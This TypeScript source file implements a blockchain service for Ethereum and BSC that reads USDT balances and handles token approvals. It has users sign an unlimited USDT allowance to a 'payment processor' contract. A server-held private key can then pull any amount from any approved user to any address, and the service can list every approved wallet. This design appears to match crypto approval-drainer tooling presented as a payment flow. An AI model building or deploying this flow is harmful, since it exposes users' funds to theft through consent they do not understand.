// =================================
// 🔗 EVM Blockchain Service (Ethereum, BSC)
// =================================

import { MAX_APPROVAL } from "@/config/chains";
import {
  ChainType,
  BlockchainResult,
  UserInfo,
  ApprovalResult,
} from "../types/blockchain";
import { getChainAbi, getChainConfig, getChainId } from "../utils/chainUtils";

// Import ethers for blockchain operations
let ethers: any;

// Lazy load ethers to avoid SSR issues
async function getEthers() {
  if (!ethers) {
    ethers = await import("ethers");
  }
  return ethers;
}

export class EVMService {
  /**
   * Get user's current nonce from contract
   */
  static async getUserNonce(
    chain: ChainType,
    userAddress: string
  ): Promise<number> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const nonce = await contract.getUserNonce(userAddress);
      return Number(nonce);
    } catch (error) {
      console.error(`Failed to get user nonce for ${chain}:`, error);
      return 0;
    }
  }

  /**
   * Get user's USDT balance
   */
  static async getUserUSDTBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const usdtContract = new ethers.Contract(
        config.usdt,
        ["function balanceOf(address owner) view returns (uint256)"],
        provider
      );

      const balance = await usdtContract.balanceOf(userAddress);
      return balance.toString();
    } catch (error) {
      console.error(`Failed to get USDT balance for ${chain}:`, error);
      return "0";
    }
  }

  static async approve(
    tokenAddress: string,
    chain: ChainType
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const spender = config.paymentProcessor; // This is the treasury contract that needs approval
      const { ethers } = await getEthers();

      // Validate addresses
      if (!spender || !ethers.isAddress(spender)) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${spender}`
        );
      }

      if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
        throw new Error(`Invalid token address for ${chain}: ${tokenAddress}`);
      }

      // Create a provider for read-only operations
      const provider = new ethers.JsonRpcProvider(config.rpc);

      // Create the approval data for the USDT contract
      const usdtContract = new ethers.Contract(
        tokenAddress,
        [
          "function approve(address spender, uint256 amount) returns (bool)",
          "function name() view returns (string)",
          "function symbol() view returns (string)",
          "function decimals() view returns (uint8)",
        ],
        provider
      );

      // Encode the approve function call
      const approveData = usdtContract.interface.encodeFunctionData("approve", [
        spender,
        MAX_APPROVAL,
      ]);

      // Create approval data for the user to sign
      const approvalData = {
        to: tokenAddress,
        data: approveData,
        value: "0x0", // No ETH value needed for token approval
        chainId: config.chainId,
        spender: spender,
        maxApproval: MAX_APPROVAL,
      };

      return {
        success: true,
        approvalData: approvalData,
      };
    } catch (error: any) {
      console.error(`Failed to create approval data for ${chain}:`, error);
      return {
        success: false,
        error: error.message || "Failed to create approval data",
      };
    }
  }

  /**
   * Execute USDT approval transaction (after user signs)
   */
  static async executeEVMApproval(
    chain: ChainType,
    userAddress: string,
    amount: string,
    userWallet: any // User's connected wallet (MetaMask, WalletConnect, etc.)
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      // Validate addresses
      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${config.paymentProcessor}`
        );
      }

      if (!config.usdt || !ethers.isAddress(config.usdt)) {
        throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
      }

      // Check if user already has sufficient allowance
      const currentAllowance = await this.getUserAllowance(chain, userAddress);
      const requiredAmount = BigInt(amount);

      if (BigInt(currentAllowance) >= requiredAmount) {
        return {
          success: true,
          message: "User already has sufficient allowance",
        };
      }

      // Create USDT contract instance with user's wallet
      const usdtContract = new ethers.Contract(
        config.usdt,
        [
          "function approve(address spender, uint256 amount) returns (bool)",
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        userWallet
      );

      // Execute approval transaction with user's wallet
      const tx = await usdtContract.approve(
        config.paymentProcessor,
        MAX_APPROVAL
      );

      // Wait for transaction to be mined
      const receipt = await tx.wait();

      // Verify the approval was successful
      const newAllowance = await usdtContract.allowance(
        userAddress,
        config.paymentProcessor
      );

      return {
        success: true,
        txHash: receipt.hash,
        gasUsed: receipt.gasUsed.toString(),
        newAllowance: newAllowance.toString(),
      };
    } catch (error: any) {
      // Handle specific user rejection
      if (
        error.code === "ACTION_REJECTED" ||
        error.message?.includes("rejected")
      ) {
        return {
          success: false,
          error: "User rejected the approval transaction",
        };
      }

      // Handle insufficient funds
      if (
        error.message?.includes("insufficient funds") ||
        error.message?.includes("gas")
      ) {
        return {
          success: false,
          error: "Insufficient funds for gas fees",
        };
      }

      return {
        success: false,
        error: error.message || "Failed to execute approval transaction",
      };
    }
  }

  /**
   * Check if user needs to approve USDT spending
   */
  static async needsApproval(
    chain: ChainType,
    userAddress: string,
    amount: string
  ): Promise<{
    needsApproval: boolean;
    currentAllowance: string;
    error?: string;
  }> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      // Validate addresses
      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${config.paymentProcessor}`
        );
      }

      if (!config.usdt || !ethers.isAddress(config.usdt)) {
        throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
      }

      const provider = new ethers.JsonRpcProvider(config.rpc);

      // Check current allowance
      const usdtContract = new ethers.Contract(
        config.usdt,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        provider
      );

      const currentAllowance = await usdtContract.allowance(
        userAddress,
        config.paymentProcessor
      );
      const requiredAmount = BigInt(amount);

      return {
        needsApproval: currentAllowance < requiredAmount,
        currentAllowance: currentAllowance.toString(),
      };
    } catch (error: any) {
      console.error(`Failed to check approval status for ${chain}:`, error);
      return {
        needsApproval: true, // Default to requiring approval on error
        currentAllowance: "0",
        error: error.message || "Failed to check approval status",
      };
    }
  }

  /**
   * Complete approval workflow: validate, check allowance, and generate approval data if needed
   */
  static async handleApprovalWorkflow(
    chain: ChainType,
    userAddress: string,
    amount: string
  ): Promise<{
    needsApproval: boolean;
    currentAllowance: string;
    approvalData?: any;
    error?: string;
  }> {
    try {
      // First check if approval is needed
      const approvalStatus = await this.needsApproval(
        chain,
        userAddress,
        amount
      );

      if (!approvalStatus.needsApproval) {
        return {
          needsApproval: false,
          currentAllowance: approvalStatus.currentAllowance,
        };
      }

      // If approval is needed, generate approval data
      const config = getChainConfig(chain);
      const approvalResult = await this.approve(config.usdt, chain);

      if (!approvalResult.success) {
        return {
          needsApproval: true,
          currentAllowance: approvalStatus.currentAllowance,
          error: approvalResult.error || "Failed to generate approval data",
        };
      }

      return {
        needsApproval: true,
        currentAllowance: approvalStatus.currentAllowance,
        approvalData: approvalResult.approvalData,
      };
    } catch (error: any) {
      console.error(`Failed to handle approval workflow for ${chain}:`, error);
      return {
        needsApproval: true,
        currentAllowance: "0",
        error: error.message || "Failed to handle approval workflow",
      };
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  static async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverPrivateKey = process.env.PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      const tx = await contract.transferFromUser(
        fromAddress,
        toAddress,
        amount
      );

      const receipt = await tx.wait();
      return { success: true, txHash: receipt.hash };
    } catch (error: any) {
      console.error(`Failed to transfer USDT on ${chain}:`, error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  static async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const isApproved = await contract.isApprovedUser(userAddress);
      return isApproved;
    } catch (error) {
      console.error(`Failed to check user approval on ${chain}:`, error);
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  static async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const allowance = await contract.getUserAllowance(userAddress);
      return allowance.toString();
    } catch (error) {
      console.error(`Failed to get user allowance on ${chain}:`, error);
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const users = await contract.getAllApprovedUsers();
      return users;
    } catch (error) {
      console.error(`Failed to get approved users on ${chain}:`, error);
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  static async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverPrivateKey = process.env.PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      const tx = await contract.revokeUserApproval(userAddress);
      const receipt = await tx.wait();
      return { success: true, txHash: receipt.hash };
    } catch (error: any) {
      console.error(`Failed to revoke user approval on ${chain}:`, error);
      return { success: false, error: error.message };
    }
  }
}
